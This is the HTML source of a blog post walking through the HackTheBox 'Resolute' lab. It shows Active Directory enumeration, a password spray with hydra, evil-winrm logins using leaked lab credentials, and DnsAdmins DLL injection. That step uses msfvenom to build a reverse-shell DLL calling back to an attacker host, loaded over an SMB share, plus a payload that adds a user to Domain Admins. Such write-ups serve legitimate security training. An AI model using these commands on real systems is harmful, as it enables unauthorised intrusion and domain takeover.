@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Resolute Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="Hackthebox - Resolute Writeup" />
+      <meta property="og:description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts." />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_resolute/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<h1 id="hackthebox---resolute-writeup">Hackthebox - Resolute Writeup</h1>
+<div class="figure">
+<img src="/img/htb_resolute/card.png" />
+
+</div>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">export</span> <span class="va">ip=</span>10.10.10.169</code></pre></div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> -sC -sV -sS -oN nmap.put <span class="va">$ip</span></code></pre></div>
+<p>open ports: * 53/tcp open domain? * 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z) * 135/tcp open msrpc Microsoft Windows RPC * 139/tcp open netbios-ssn Microsoft Windows netbios-ssn * 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) * 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) * 464/tcp open kpasswd5? * 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 * 636/tcp open tcpwrapped * 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local)</p>
+<div class="figure">
+<img src="/img/htb_resolute/1.png" />
+
+</div>
+<p>We see that the server is running windows and has active directory. From the nmap scripts we fine the domain name and forest name as <strong>&quot;megabank.local&quot;</strong>. So we add a host to our /etc/hosts file</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> <span class="st">&quot;10.10.10.169 megabank.local&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</code></pre></div>
+<p>We also fine that the smb server running allows guest authentication.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="active-directory---enum4linux">Active Directory - enum4linux</h2>
+<p>We enumerate using enum4linux</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">enum4linux</span> -a <span class="va">$ip</span></code></pre></div>
+<p>In the output, we find the following users and groups</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">Group</span> <span class="st">&#39;Schema Admins&#39;</span> (RID: 518) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Group Policy Creator Owners&#39;</span> (RID: 520) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Domain Guests&#39;</span> (RID: 514) <span class="ex">has</span> member: MEGABANK\Guest
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\DefaultAccount
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\krbtgt
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\ryan
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\marko
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\sunita
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\abigail
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\marcus
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\sally
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\fred
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\angela
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\felicia
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\gustavo
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\ulf
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\stevie
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\claire
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\paulo
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\steve
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\annette
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\annika
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\per
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\claude
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\melanie
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\zach
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\simon
+<span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> (RID: 513) <span class="ex">has</span> member: MEGABANK\naoki
+<span class="ex">Group</span> <span class="st">&#39;Domain Admins&#39;</span> (RID: 512) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Enterprise Admins&#39;</span> (RID: 519) <span class="ex">has</span> member: MEGABANK\Administrator
+<span class="ex">Group</span> <span class="st">&#39;Domain Controllers&#39;</span> (RID: 516) <span class="ex">has</span> member: MEGABANK\RESOLUTE$
+<span class="ex">Group</span> <span class="st">&#39;Domain Computers&#39;</span> (RID: 515) <span class="ex">has</span> member: MEGABANK\MS02$
+<span class="ex">Group</span> <span class="st">&#39;Contractors&#39;</span> (RID: 1103) <span class="ex">has</span> member: MEGABANK\ryan</code></pre></div>
+<p>We also find the password policy if we need to bruteforce</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">[<span class="ex">+</span>] Retieved partial password policy with rpcclient:
+
+<span class="ex">Password</span> Complexity: Disabled
+<span class="ex">Minimum</span> Password Length: 7</code></pre></div>
+<p>Having a thorough look at the output of enum4linux, we get</p>
+<div class="figure">
+<img src="/img/htb_resolute/2.png" />
+
+</div>
+<p>So a user marko has written a password in the description</p>
+<blockquote>
+<p>Password: Welcome123!</p>
+</blockquote>
+<h2 id="active-directory---ldapsearch">Active directory - ldapsearch</h2>
+<p>We see that the server is running ldap. We can retrieve the info we found with enum4linux using ldapsearch as well. First we need the rootds. to get that, we can use the nmap script <strong>ldap-search</strong> or we can use ldapsearch as well.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> --script=ldap-search -Pn -p 389 10.10.10.169
+<span class="ex">ldapsearch</span> -x -h 10.10.10.169 -s base namingcontexts  # Cleaner results</code></pre></div>
+<p>NOTE: -x for simple authentication -h for host -s for scope</p>
+<div class="figure">
+<img src="/img/htb_resolute/11.png" />
+
+</div>
+<p>We get the root dn:</p>
+<blockquote>
+<p>DC=megabank,DC=local</p>
+</blockquote>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 <span class="co"># all scopes</span>
+<span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 -s base <span class="co"># base scope</span>
+<span class="ex">ldapsearch</span> -x -b <span class="st">&quot;dc=megabank, dc=local&quot;</span> -h 10.10.10.169 -s sub  # scope subtree
+
+<span class="ex">ldapsearch</span> -x -b <span class="st">&quot;cn=users, dc=megabank, dc=local&quot;</span> -h 10.10.10.169</code></pre></div>
+<ul>
+<li>dn = distinguished name</li>
+<li>cn = common name</li>
+<li>dc = domain component</li>
+<li>ou = organizational unit</li>
+</ul>
+<p>To get a better grasp of ldap namespaces, go <a href="https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7">here.</a></p>
+<p>Looking through the output, we can find the description of the user marko to get the password.</p>
+<h2 id="active-directory---rpcclient">Active directory - rpcclient</h2>
+<p>We can get the users and userinfo using rpcclient NULL authentication</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> -U <span class="st">&#39;&#39;</span> -I 10.10.10.169 megabank.local</code></pre></div>
+<p>We can execute the following rpcclient commands</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers  # Get a list of users with their rid</code></pre></div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x457 <span class="co"># get userinfo with rid. user marko here</span></code></pre></div>
+<div class="figure">
+<img src="/img/htb_resolute/12.png" />
+
+</div>
+<p>We get the password.</p>
+<p>We can look at all the users' basic info using</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">rpclient</span> $<span class="op">&gt;</span> querydispinfo</code></pre></div>
+<h1 id="privilege-escalation---user-melanie">Privilege Escalation - User Melanie</h1>
+<h2 id="login-using-found-creds">Login using found creds</h2>
+<p>We try logging into the smb server using the found creds but get an authentication error</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbmap</span> -u <span class="st">&quot;marko&quot;</span> -p <span class="st">&quot;Welcome123!&quot;</span> -H megabank.local</code></pre></div>
+<h2 id="hydra-user-bruteforce">Hydra user bruteforce</h2>
+<p>It seems that the password found is not for the user &quot;marko&quot;. We found many other users. We try bruteforcing the found passwords against the users. For this we create a file &quot;user.txt&quot; that contains the names of our users. Then we bruteforce the users using hydra</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">hydra</span> -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f</code></pre></div>
+<p>We get a hit</p>
+<div class="figure">
+<img src="/img/htb_resolute/3.png" />
+
+</div>
+<p>So the password is for the user <strong>melanie</strong></p>
+<p>Creds:</p>
+<blockquote>
+<p>User: melanie<br />
+Password: Welcome123!</p>
+</blockquote>
+<h2 id="getting-a-shell-with-evil-winrm">Getting a shell with evil-winrm</h2>
+<p>Using our found creds, we try getting a winrm shell using evil-winrm</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">evil-winrm</span> -i  megabank.local -u melanie -p Welcome123!</code></pre></div>
+<p>And we get a shell as the user melanie</p>
+<div class="figure">
+<img src="/img/htb_resolute/4.png" />
+
+</div>
+<p>We find our user.txt file under the . So this is our required user.</p>
+<div class="figure">
+<img src="/img/htb_resolute/5.png" />
+
+</div>
+<h1 id="privilege-escaltion---user-ryan">Privilege Escaltion - User ryan</h1>
+<p>In the C: drive we find an interesting folder PSTranscripts/. Going in, we find a file &quot;PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&quot; inside another folder. We have a look at the contents of the file.</p>
+<pre class="poweshell"><code>type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></pre>
+<div class="figure">
+<img src="/img/htb_resolute/6.png" />
+
+</div>
+<p>We find the backup of the password for the user <strong>ryan</strong></p>
+<p>Creds:</p>
+<blockquote>
+<p>User: ryan<br />
+Password: Serv3r4Admin4cc123!</p>
+</blockquote>
+<p>We try logging in with evilwinrm</p>
+<p>In the directory, we fine a note.txt that says</p>
+<pre class="txt"><code>Email to team:
+
+- due to change freeze, any system changes (apart from those to the
+  administrator account) will be automatically reverted within 1 minute</code></pre>
+<h1 id="privilege-escalation---administrator">Privilege escalation - Administrator</h1>
+<h2 id="dll-injection-in-dns-service">DLL injection in DNS service</h2>
+<p>Issuing the command whoami, we find that our user ryan is a memeber of the group <strong>dnsadmins</strong></p>
+<pre class="powershell"><code>whoami /all</code></pre>
+<div class="figure">
+<img src="/img/htb_resolute/7.png" />
+
+</div>
+<p>Members of the group dnsadmins can be used for privilege escalation to admin with dll injection. This trick is described <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a>.</p>
+<p>We can generate our payload dll with msfvenom.</p>
+<pre class="shell"><code>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 -f dll -o dns.dll
+smbserver.py SHARE ./</code></pre>
+<p>On target, we can change the config of the dns since the user ryan belongs to the group <strong>dnsadmins</strong>. We can also start and stop the dns service.</p>
+<pre class="powershell"><code>dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.14.55\SHARE\dnsprivesc.dll
+sc.exe stop dns
+sc.exe start dns</code></pre>
+<div class="figure">
+<img src="/img/htb_resolute/8.png" />
+
+</div>
+<p>We open up a nc listener at port 8888</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> -lnvp 8888</code></pre></div>
+<p>Trying a couple of times, failed to get back a reverse shell. Not sure why it did not work. A workaround would be elevating the privileges of a user that we know the password of generating an <strong>exex</strong> payload using msfvenom. We can try adding the user melanie to the admins group using the dll payload. Then the user melanie would give us administrative privileges on the machine. We generate the payload and do the previous steps again on target.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">msfvenom</span> -p windows/x64/exec cmd=<span class="st">&#39;net group &quot;domain admins&quot; melanie /add /domain&#39;</span> --platform windows -f dll <span class="op">&gt;</span> dns.dll
+<span class="ex">smbserver.py</span> SHARE ./</code></pre></div>
+<p>Next we login to user melanie using evilwinrm and look at our user info using</p>
+<pre class="powershell"><code>whoami /all</code></pre>
+<div class="figure">
+<img src="/img/htb_resolute/9.png" />
+
+</div>
+<p>We see that we are now a member of the administrator group and can execute administrator commands. So we can get our required root.txt at C:.txt</p>
+<div class="figure">
+<img src="/img/htb_resolute/10.png" />
+
+</div>
+</article>
+
+<footer>
+  <p> By fmash16 </p>
+</footer>
+</body>
